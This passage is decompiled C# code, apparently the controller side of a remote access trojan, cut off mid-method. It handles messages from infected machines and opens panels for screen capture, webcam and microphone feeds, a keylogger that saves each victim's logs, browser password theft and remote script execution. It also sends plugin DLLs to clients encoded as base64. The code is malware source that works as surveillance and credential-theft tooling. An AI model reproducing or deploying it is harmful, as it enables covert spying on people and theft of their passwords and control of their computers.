						PFGR pFGR = new PFGR();
						((Control)pFGR).set_Name(sock + "FINFO");
						((Form)pFGR).set_Text(SocketServer.Decode(array[1]) + " Properties");
						string[] array2 = Strings.Split(SocketServer.Decode(array[2]).ToString(), "|FMSPLITER|", -1, (CompareMethod)0);
						pFGR.FP = array[4];
						pFGR.Sock = sock;
						pFGR.IT = Conversions.ToBoolean(array[3]);
						if (Conversions.ToBoolean(array[3]))
						{
							if (Operators.CompareString(array2[0], "N/A", false) != 0)
							{
								pFGR.PictureBox1.set_Image(Image.FromStream((Stream)new MemoryStream(Convert.FromBase64String(array2[0]))));
							}
						}
						else
						{
							pFGR.PictureBox1.set_Image(MyProject.Forms.FMGR.ImageList2.get_Images().get_Item(15));
						}
						((Form)pFGR).set_Icon(Icon.FromHandle(new Bitmap(pFGR.PictureBox1.get_Image()).GetHicon()));
						pFGR.FN.set_Text(Convert.ToString(SocketServer.Decode(array[1])));
						pFGR.Label1.set_Text(array2[1]);
						pFGR.Label2.set_Text(array2[2]);
						pFGR.Label3.set_Text(SocketServer.Decode(array2[3]));
						try
						{
							int num = Conversions.ToInteger(array2[4]);
							pFGR.Label4.set_Text(SocketServer.GetSize(Conversions.ToULong(array2[4])) + " (" + num.ToString("N") + " bytes)");
						}
						catch (Exception projectError9)
						{
							ProjectData.SetProjectError(projectError9);
							pFGR.Label4.set_Text("0.00 bytes (0.00 bytes)");
							ProjectData.ClearProjectError();
						}
						pFGR.Label5.set_Text(array2[5]);
						pFGR.Label6.set_Text(array2[6]);
						pFGR.Label7.set_Text(array2[7]);
						if (!Convert.ToBoolean(array[3]))
						{
							((Control)pFGR.RN).set_Enabled(false);
							pFGR.REN = false;
						}
						else
						{
							pFGR.RN.set_Checked(Convert.ToBoolean(array2[8]));
							pFGR.REN = Convert.ToBoolean(array2[8]);
						}
						pFGR.HI.set_Checked(Convert.ToBoolean(array2[9]));
						pFGR.FNS = SocketServer.Decode(array[1]).ToString();
						pFGR.HIF = Convert.ToBoolean(array2[9]);
						if (Convert.ToBoolean(array[3]))
						{
							pFGR.FINFO.get_Items().Add("File description :").get_SubItems()
								.Add(array2[2]);
							pFGR.FINFO.get_Items().Add("Type :").get_SubItems()
								.Add(array2[1]);
							pFGR.FINFO.get_Items().Add("File version :").get_SubItems()
								.Add(array2[10]);
							pFGR.FINFO.get_Items().Add("Product name :").get_SubItems()
								.Add(array2[11]);
							pFGR.FINFO.get_Items().Add("Product version :").get_SubItems()
								.Add(array2[12]);
							pFGR.FINFO.get_Items().Add("Copyright :").get_SubItems()
								.Add(array2[13]);
							pFGR.FINFO.get_Items().Add("Size :").get_SubItems()
								.Add(SocketServer.GetSize(Conversions.ToULong(array2[4])));
							pFGR.FINFO.get_Items().Add("Data modified :").get_SubItems()
								.Add(array2[6]);
						}
						else
						{
							pFGR.TabControl1.get_TabPages().Remove(pFGR.TabPage2);
						}
						((Control)pFGR).Show();
						((Control)pFGR.Apply).set_Enabled(false);
					}
				}
				else if (Operators.CompareString(array[0], "GRFIF", false) == 0)
				{
					DRFGR dRFGR = (DRFGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("DRF" + array[2]);
					dRFGR.R = array[1];
					Thread.Sleep(2000);
					dRFGR.ListView1.get_Items().Clear();
					s.Send(sock, "Getrarfilesinside" + Key + array[1]);
				}
				else if (Operators.CompareString(array[0], "Getrarfilesinside", false) == 0)
				{
					DRFGR dRFGR2 = (DRFGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("DRF" + array[4]);
					if (Operators.CompareString(Functions.Decode(array[2]), "D", false) == 0)
					{
						dRFGR2.ListView1.get_Items().Add(Functions.Decode(array[1]), 0).get_SubItems()
							.Add("File Folder");
					}
					else if (Operators.CompareString(Functions.Decode(array[2]), "F", false) == 0)
					{
						dRFGR2.ListView1.get_Items().Add(Functions.Decode(array[1]), 1).get_SubItems()
							.Add(Functions.Decode(array[3]));
					}
				}
				else if (Operators.CompareString(array[0], "RARResult", false) == 0)
				{
					DRFGR dRFGR3 = (DRFGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("DRF" + array[1]);
					((Control)dRFGR3.ListView1).set_Enabled(true);
					((ToolStripItem)dRFGR3.ToolStripStatusLabel1).set_Text("File list successfully created");
					((Control)dRFGR3.GRF).set_Enabled(true);
					((Control)dRFGR3.RF).set_Enabled(true);
					s.Send(sock, "RARC");
				}
				else if (Operators.CompareString(array[0], "CaptureScreen", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("CaptureScreen" + array[4]) == null)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data3 = this.data;
							((Control)this).Invoke((Delegate)data3, new object[2] { sock, b });
						}
						else
						{
							RDGR rDGR = new RDGR();
							rDGR.sock = sock;
							((Control)rDGR).set_Name("CaptureScreen" + array[4]);
							ref Size sz = ref rDGR.Sz;
							sz = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
							((Form)rDGR).set_Text("[ Remote Desktop ][ " + SocketServer.Decode(array[3]) + " | " + s.IP(ref sock) + " | " + array[1] + " X " + array[2] + " ]");
							rDGR.T = ((Form)rDGR).get_Text();
							rDGR.FolderSavePic = Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[3]) + "\\Desktop\\";
							int num2 = (int)Math.Round(Conversions.ToDouble(array[5]) - 1.0);
							int num3 = 0;
							while (true)
							{
								int num4 = num3;
								int num5 = num2;
								if (num4 > num5)
								{
									break;
								}
								rDGR.D.get_Items().Add((object)("Device : " + num3));
								num3++;
								num3 += 0;
							}
							((Control)rDGR).Show();
						}
					}
				}
				else if (Operators.CompareString(array[0], "Start Capture", false) == 0)
				{
					try
					{
						if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("CaptureScreen" + array[2]) == null)
						{
							return;
						}
						RDGR rDGR2 = (RDGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("CaptureScreen" + array[2]);
						((ProgressBar)rDGR2.VerticalProgressbar1).set_Value(0);
						if (rDGR2 != null && array[1].Length != 1 && Operators.ConditionalCompareObjectEqual(((Control)rDGR2.ST).get_Tag(), (object)"1", false))
						{
							try
							{
								((Control)rDGR2.SH).Focus();
								byte[] bytes = Encoding.Default.GetBytes(array[1]);
								MemoryStream memoryStream = new MemoryStream(bytes);
								rDGR2.P1.set_Image(Image.FromStream((Stream)memoryStream));
								((Form)rDGR2).set_Text(rDGR2.T + " ======> " + ((Control)rDGR2.P1).get_Width() + " X " + ((Control)rDGR2.P1).get_Height() + " - Packet : [ " + SocketServer.GetSize((ulong)bytes.Length) + " ]");
								((ProgressBar)rDGR2.VerticalProgressbar1).set_MarqueeAnimationSpeed(bytes.Length);
								((ProgressBar)rDGR2.VerticalProgressbar1).set_Maximum(bytes.Length);
								((ProgressBar)rDGR2.VerticalProgressbar1).Increment(bytes.Length);
							}
							catch (Exception projectError10)
							{
								ProjectData.SetProjectError(projectError10);
								ProjectData.ClearProjectError();
							}
							if (Operators.ConditionalCompareObjectEqual(((Control)rDGR2.SA).get_Tag(), (object)"1", false))
							{
								try
								{
									byte[] bytes2 = (byte[])NewLateBinding.LateIndexGet((object)Functions.fx(b, "Start Capture" + Key), new object[1] { 1 }, (string[])null);
									File.WriteAllBytes(rDGR2.FolderSavePic + "\\" + DateTime.Now.ToString("yyyy-MM-dd") + "_" + DateAndTime.get_TimeOfDay().ToString("h-mm-ss tt") + ".png", bytes2);
								}
								catch (Exception projectError11)
								{
									ProjectData.SetProjectError(projectError11);
									ProjectData.ClearProjectError();
								}
							}
						}
					}
					catch (Exception projectError12)
					{
						ProjectData.SetProjectError(projectError12);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "GPL", false) == 0)
				{
					if ((Operators.CompareString(array[1], "RD", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\RD.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "RD" + Key + "RD" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\RD.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "FM", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\FM.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "FM" + Key + "FM" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\FM.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "PW", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\PW.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "PW" + Key + "PW" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\PW.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "SI", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\SI.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "SI" + Key + "SI" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SI.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "MC", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\MC.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "MC" + Key + "MC" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\MC.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "KE", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\KE.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "KE" + Key + "KE" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\KE.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "PA", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\PA.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "PA" + Key + "PA" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\PA.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "SM", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\SM.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "SM" + Key + "SM" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SM.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "TS", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\TS.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "TS" + Key + "TS" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\TS.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "RW", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\RW.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "RW" + Key + "RW" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\RW.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "CH", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\CH.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "CH" + Key + "CH" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\CH.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "SC", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\SC.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "SC" + Key + "SC" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SC.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					else if ((Operators.CompareString(array[1], "SP", false) == 0 && File.Exists(Application.get_StartupPath() + "\\Plugins\\SP.dll")) ? true : false)
					{
						s.Send(sock, "LP" + Key + "SP" + Key + "SP" + Key + Convert.ToBase64String(File.ReadAllBytes(Application.get_StartupPath() + "\\Plugins\\SP.dll")) + Key + Conversions.ToString(sock) + Key + Conversions.ToString(true) + Key + array[2] + Key + array[3]);
					}
					TD(sock);
				}
				else if (Operators.CompareString(array[0], "OpenScript", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenScript" + array[3]) != null)
					{
						s.Send(Conversions.ToInteger(array[3]), "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data4 = this.data;
						((Control)this).Invoke((Delegate)data4, new object[2] { sock, b });
					}
					else
					{
						ScriptGR scriptGR = new ScriptGR();
						scriptGR.sock = sock;
						((Control)scriptGR).set_Name("OpenScript" + array[3]);
						((Form)scriptGR).set_Text("[ Scripts Manager ][ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
						((Control)scriptGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "SCS", false) == 0)
				{
					ScriptGR scriptGR2 = (ScriptGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenScript" + array[2]);
					scriptGR2.Label1.set_Text("Status : " + SocketServer.Decode(array[1]).ToString());
					if (array[3].ToString().Contains("Visual Basic"))
					{
						((Control)scriptGR2.CNET).set_Enabled(true);
					}
					else if (array[3].Contains("CSharp"))
					{
						((Control)scriptGR2.Csharpc).set_Enabled(true);
					}
					else if (array[3].Contains("Batch"))
					{
						((Control)scriptGR2.EX).set_Enabled(true);
					}
					else if (array[3].Contains("Autiot"))
					{
						((Control)scriptGR2.CAUT).set_Enabled(true);
					}
					else if (array[3].Contains("IL"))
					{
						((Control)scriptGR2.ILB).set_Enabled(true);
					}
					else if (array[3].Contains("PS"))
					{
						((Control)scriptGR2.RVPS).set_Enabled(true);
					}
					else if (array[3].Contains("AHK"))
					{
						((Control)scriptGR2.AHKB).set_Enabled(true);
					}
				}
				else if (Operators.CompareString(array[0], "SCE", false) == 0)
				{
					ScriptGR scriptGR3 = (ScriptGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OpenScript" + array[2]);
					scriptGR3.Label1.set_Text("Status : Error : " + SocketServer.Decode(array[1]).ToString());
					if (Operators.CompareString(array[3], "Batch", false) == 0)
					{
						((Control)scriptGR3.EX).set_Enabled(true);
					}
					else if (array[3].Contains("Autiot"))
					{
						((Control)scriptGR3.CAUT).set_Enabled(true);
					}
					else if (array[3].Contains("IL"))
					{
						((Control)scriptGR3.ILB).set_Enabled(true);
					}
					else if (array[3].Contains("PS"))
					{
						((Control)scriptGR3.RVPS).set_Enabled(true);
					}
					else if (array[3].Contains("AHK"))
					{
						((Control)scriptGR3.AHKB).set_Enabled(true);
					}
					else
					{
						scriptGR3.Label1.set_Text("Status : Error");
						string[] array3 = Strings.Split(SocketServer.Decode(array[1]).ToString(), "|+|", -1, (CompareMethod)0);
						if (Operators.CompareString(array[3], "Visual Basic .NET", false) == 0)
						{
							((Control)scriptGR3.CNET).set_Enabled(true);
							scriptGR3.Fxlsv1.get_Items().Clear();
						}
						else
						{
							((Control)scriptGR3.Csharpc).set_Enabled(true);
							scriptGR3.Fxlsv2.get_Items().Clear();
						}
						int num6 = array3.Length - 2;
						int num7 = 0;
						while (true)
						{
							int num8 = num7;
							int num5 = num6;
							if (num8 <= num5)
							{
								if (Operators.CompareString(array[3], "Visual Basic .NET", false) == 0)
								{
									ListViewItem val18 = scriptGR3.Fxlsv1.get_Items().Add(array3[num7], 0);
									val18.get_SubItems().Add(Convert.ToString(num7 + 1));
									val18.get_SubItems().Add(Convert.ToString(num7 + 2));
									num7 += 2;
								}
								else
								{
									ListViewItem val19 = scriptGR3.Fxlsv2.get_Items().Add(array3[num7], 0);
									val19.get_SubItems().Add(Convert.ToString(num7 + 1));
									val19.get_SubItems().Add(Convert.ToString(num7 + 2));
									num7 += 2;
								}
								num7++;
								num7 += 0;
								continue;
							}
							break;
						}
					}
				}
				else if (Operators.CompareString(array[0], "OCF", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("OPC" + array[3]) != null)
					{
						s.Send(sock, "Abort");
					}
					else if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + array[3]) != null)
					{
						s.Send(sock, "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data5 = this.data;
						((Control)this).Invoke((Delegate)data5, new object[2] { sock, b });
					}
					else
					{
						ChatOGR chatOGR = new ChatOGR();
						((Form)chatOGR).set_Text("[ Chat Settings ][ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
						chatOGR.Sock = sock;
						((Control)chatOGR).set_Name("OPC" + array[3]);
						chatOGR.OS = int.Parse(array[3]);
						chatOGR.Devices = SocketServer.Decode(array[2]);
						chatOGR.FTT = SocketServer.Decode(array[1]).ToString();
						((Form)chatOGR).ShowDialog();
					}
				}
				else if (Operators.CompareString(array[0], "ET", false) == 0)
				{
					ChatGR chatGR = (ChatGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + array[1]);
					chatGR.TT(chatGR.ClinetColor, SocketServer.Decode(chatGR.CID).ToString(), SocketServer.Decode(array[2]).ToString());
				}
				else if (Operators.CompareString(array[0], "PC", false) == 0)
				{
					ChatGR chatGR2 = (ChatGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + array[1]);
					chatGR2.TT(Color.Red, SocketServer.Decode(chatGR2.CID).ToString(), "Buzz!!");
					int x = ((Form)chatGR2).get_Location().X;
					Size size = new Size(x, ((Form)chatGR2).get_Location().Y);
					Form val20 = (Form)(object)chatGR2;
					Point location = new Point(size.Width - 3, size.Height + 3);
					val20.set_Location(location);
					Thread.Sleep(10);
					Form val21 = (Form)(object)chatGR2;
					location = new Point(size.Width + 3, size.Height - 3);
					val21.set_Location(location);
					Thread.Sleep(10);
					Form val22 = (Form)(object)chatGR2;
					location = new Point(size.Width - 5, size.Height + 5);
					val22.set_Location(location);
					Thread.Sleep(10);
					Form val23 = (Form)(object)chatGR2;
					location = new Point(size.Width + 5, size.Height - 5);
					val23.set_Location(location);
					Thread.Sleep(10);
					Form val24 = (Form)(object)chatGR2;
					location = new Point(size.Width - 8, size.Height + 8);
					val24.set_Location(location);
					Thread.Sleep(10);
					Form val25 = (Form)(object)chatGR2;
					location = new Point(size.Width + 8, size.Height - 8);
					val25.set_Location(location);
					Thread.Sleep(10);
					Form val26 = (Form)(object)chatGR2;
					location = new Point(size.Width, size.Height);
					val26.set_Location(location);
				}
				else if (Operators.CompareString(array[0], "CWC", false) == 0)
				{
					ChatGR chatGR3 = (ChatGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + array[2]);
					chatGR3.Pic.set_Image((Image)new Bitmap(Image.FromStream((Stream)new MemoryStream(Convert.FromBase64String(array[1])))));
				}
				else if (Operators.CompareString(array[0], "IsTyping", false) == 0)
				{
					ChatGR chatGR4 = (ChatGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Chat" + array[1]);
					if (Conversions.ToBoolean(array[2]))
					{
						chatGR4.Label2.set_Text(chatGR4.OLDStatus);
						((Control)chatGR4.PictureBox3).set_Visible(false);
					}
					else if (chatGR4.B == 0)
					{
						chatGR4.B = 1;
						chatGR4.Label2.set_Text("Status : " + SocketServer.Decode(chatGR4.CID) + " typing .");
						((Control)chatGR4.PictureBox3).set_Visible(true);
					}
					else if (chatGR4.B == 1)
					{
						chatGR4.Label2.set_Text("Status : " + SocketServer.Decode(chatGR4.CID) + " typing ..");
						chatGR4.B = 2;
						((Control)chatGR4.PictureBox3).set_Visible(true);
					}
					else if (chatGR4.B == 2)
					{
						chatGR4.Label2.set_Text("Status : " + SocketServer.Decode(chatGR4.CID) + " typing ...");
						chatGR4.B = 0;
						((Control)chatGR4.PictureBox3).set_Visible(true);
					}
				}
				else if (Operators.CompareString(array[0], "Open Remote WebCam", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + array[2]) != null)
					{
						s.Send(Conversions.ToInteger(array[2]), "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data6 = this.data;
						((Control)this).Invoke((Delegate)data6, new object[2] { sock, b });
					}
					else
					{
						RWGR rWGR = new RWGR();
						rWGR.Sock = sock;
						((Control)rWGR).set_Name("Open Remote WebCam" + array[2]);
						((Form)rWGR).set_Text("[ Remote WebCam ][ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
						rWGR.RWT = ((Form)rWGR).get_Text();
						rWGR.FolderSavePic = Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + "\\Camera\\";
						((Control)rWGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "Devices", false) == 0)
				{
					RWGR rWGR2 = (RWGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + array[2]);
					string[] array4 = Strings.Split(SocketServer.Decode(array[1]), "REVRATPL", -1, (CompareMethod)0);
					int num9 = 0;
					int num10 = array4.Length - 1;
					num9 = 0;
					while (true)
					{
						int num11 = num9;
						int num5 = num10;
						if (num11 > num5)
						{
							break;
						}
						if (Operators.CompareString(array4[num9], "", false) != 0)
						{
							if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + array[2]) != null)
							{
							}
							rWGR2.Devices.get_Items().Add(array4[num9], 0);
						}
						num9++;
						num9 += 0;
					}
					((Control)rWGR2.Devices).set_Enabled(true);
					((Control)rWGR2.Start).set_Enabled(true);
					((Control)rWGR2.Refresh).set_Enabled(true);
					((Control)rWGR2.AutoSave).set_Enabled(true);
				}
				else if (Operators.CompareString(array[0], "Camera Picture", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + array[2]) == null)
					{
						s.Send(sock, "Stop");
					}
					else
					{
						RWGR rWGR3 = (RWGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Open Remote WebCam" + array[2]);
						((ProgressBar)rWGR3.SocketServer1).set_Value(0);
						if (Operators.CompareString(((ButtonBase)rWGR3.Start).get_Text(), "Stop Capture", false) == 0)
						{
							byte[] bytes3 = Encoding.Default.GetBytes(array[1]);
							MemoryStream memoryStream2 = new MemoryStream(bytes3);
							rWGR3.PictureBox1.set_Image(Image.FromStream((Stream)memoryStream2));
							rWGR3.Label4.set_Text("Size : " + Functions.siz(bytes3.Length.ToString()).ToString());
							memoryStream2.Dispose();
							((ProgressBar)rWGR3.SocketServer1).set_MarqueeAnimationSpeed(bytes3.Length);
							((ProgressBar)rWGR3.SocketServer1).set_Maximum(bytes3.Length);
							((ProgressBar)rWGR3.SocketServer1).Increment(bytes3.Length);
							((Form)rWGR3).set_Text(rWGR3.RWT + " - Packet : [ " + SocketServer.GetSize((ulong)bytes3.Length) + " ]");
							if (rWGR3.AutoSave.get_Checked())
							{
								try
								{
									File.WriteAllBytes(rWGR3.FolderSavePic + "\\" + DateTime.Now.ToString("yyyy-MM-dd") + "_" + DateAndTime.get_TimeOfDay().ToString("h-mm-ss tt") + ".png", bytes3);
								}
								catch (Exception projectError13)
								{
									ProjectData.SetProjectError(projectError13);
									ProjectData.ClearProjectError();
								}
							}
						}
						s.Send(this.sock, "Start" + Key + "0");
					}
				}
				else if (Operators.CompareString(array[0], "Pastime", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Pastime" + array[3]) != null)
					{
						s.Send(int.Parse(array[3]), "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data7 = this.data;
						((Control)this).Invoke((Delegate)data7, new object[2] { sock, b });
					}
					else
					{
						PastimeGR pastimeGR = new PastimeGR();
						pastimeGR.Sock = sock;
						((Control)pastimeGR).set_Name("Pastime" + array[3]);
						((Form)pastimeGR).set_Text("[ Pastime ] [ " + SocketServer.Decode(array[1]).ToString() + " | " + s.IP(ref sock).ToString() + " ]");
						((Control)pastimeGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "KE", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("KE" + array[2]) == null)
					{
						if (((Control)this).get_InvokeRequired())
						{
							_data data8 = this.data;
							((Control)this).Invoke((Delegate)data8, new object[2] { sock, b });
						}
						else
						{
							KeyloggerGR keyloggerGR = new KeyloggerGR();
							keyloggerGR.Sock = sock;
							((Control)keyloggerGR).set_Name("KE" + array[2]);
							((Form)keyloggerGR).set_Text("[ Keylogger ] [ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
							keyloggerGR.Path = Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + "\\Logs\\";
							((Control)keyloggerGR).Show();
						}
					}
				}
				else if (Operators.CompareString(array[0], "KE Logs", false) == 0)
				{
					KeyloggerGR keyloggerGR2 = (KeyloggerGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("KE" + array[2]);
					if (Operators.CompareString(keyloggerGR2.Old, SocketServer.Decode(array[1]), false) == 0)
					{
					}
					if (Operators.CompareString(keyloggerGR2.txtbLogs.get_Text(), "", false) == 0)
					{
						keyloggerGR2.txtbLogs.set_Text("");
					}
					TextBox txtbLogs = keyloggerGR2.txtbLogs;
					lock (txtbLogs)
					{
						((TextBoxBase)keyloggerGR2.txtbLogs).AppendText(SocketServer.Decode(array[1]));
					}
					((TextBoxBase)keyloggerGR2.txtbLogs).ScrollToCaret();
					try
					{
						File.WriteAllText(keyloggerGR2.Path + keyloggerGR2.T + "\\" + keyloggerGR2.TH + ".Log", SocketServer.Decode(array[1]));
					}
					catch (Exception projectError14)
					{
						ProjectData.SetProjectError(projectError14);
						ProjectData.ClearProjectError();
					}
				}
				else if (Operators.CompareString(array[0], "OMICForm", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Microphone" + array[3]) != null)
					{
						s.Send(sock, "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data9 = this.data;
						((Control)this).Invoke((Delegate)data9, new object[2] { sock, b });
					}
					else
					{
						MicrophoneGR microphoneGR = new MicrophoneGR();
						microphoneGR.sock = sock;
						((Control)microphoneGR).set_Name("Microphone" + array[3]);
						((Form)microphoneGR).set_Text("[ Audio Feed ] [ " + SocketServer.Decode(array[1]).ToString() + " | " + s.IP(ref sock).ToString() + " ]");
						string[] array5 = Strings.Split(SocketServer.Decode(array[2]), "|", -1, (CompareMethod)0);
						int num12 = 0;
						int num13 = array5.Length - 2;
						num12 = 0;
						while (true)
						{
							int num14 = num12;
							int num5 = num13;
							if (num14 > num5)
							{
								break;
							}
							microphoneGR.DV.get_Items().Add((object)array5[num12]);
							num12++;
							num12 += 0;
						}
						microphoneGR.DV.set_SelectedIndex(0);
						microphoneGR.BZ.set_SelectedIndex(3);
						microphoneGR.CT.set_SelectedIndex(0);
						((Control)microphoneGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "Audio Feed", false) == 0)
				{
					MicrophoneGR microphoneGR2 = (MicrophoneGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Microphone" + array[2]);
					microphoneGR2.RS(Encoding.Default.GetBytes(array[1]));
				}
				else if (Operators.CompareString(array[0], "OpenPasswords", false) == 0)
				{
					if (((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Passwords" + array[3]) != null)
					{
						s.Send(int.Parse(array[3]), Key + "Abort");
					}
					else if (((Control)this).get_InvokeRequired())
					{
						_data data10 = this.data;
						((Control)this).Invoke((Delegate)data10, new object[2] { sock, b });
					}
					else
					{
						PasswordsGR passwordsGR = new PasswordsGR();
						passwordsGR.Sock = sock;
						((Control)passwordsGR).set_Name("Passwords" + array[3]);
						((Form)passwordsGR).set_Text("[ Passwords Recovery ][ " + SocketServer.Decode(array[1]) + " | " + s.IP(ref sock) + " ]");
						((ToolStripItem)passwordsGR.ToolStripStatusLabel2).set_Text(array[2]);
						passwordsGR.Path = Application.get_StartupPath() + "\\Users\\" + SocketServer.Decode(array[1]) + "\\Passwords\\";
						((Control)passwordsGR).Show();
					}
				}
				else if (Operators.CompareString(array[0], "Paaswords", false) == 0)
				{
					PasswordsGR passwordsGR2 = (PasswordsGR)(object)((WindowsFormsApplicationBase)MyProject.Application).get_OpenForms().get_Item("Passwords" + array[5]);
					if (Operators.CompareString(array[4], "Chorme", false) == 0)
					{
